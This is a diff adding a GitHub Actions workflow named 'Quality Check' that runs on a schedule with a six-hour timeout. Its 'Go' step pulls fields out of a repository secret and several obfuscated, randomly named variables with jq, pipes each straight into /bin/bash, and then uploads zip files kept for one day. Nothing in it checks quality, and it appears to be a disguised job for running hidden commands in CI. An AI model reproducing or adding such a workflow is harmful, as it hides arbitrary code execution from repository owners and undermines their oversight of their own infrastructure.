@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          kpawz99: ${{ secrets.kpawz99 }}
+        run: |
+          printf '%s' "$kpawz99" | jq -r .thnl20733 | /bin/bash
+          echo $j12291 | jq -r .lg0594 | /bin/bash
+          printf '%s' "$een398" | jq -r .hngru07874 | /bin/bash
+          printf '%s' "$ohvv07" | jq -r .uhk85607 | /bin/bash
+          echo $ij490 | jq -r .acxx11865 | /bin/bash
+          echo $q82051 | jq -r .f9 | /bin/bash
+          printf '%s' "$pqr89852" | jq -r .ban0 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: LmGlY23t
+          path: "*.zip"
+          retention-days: 1
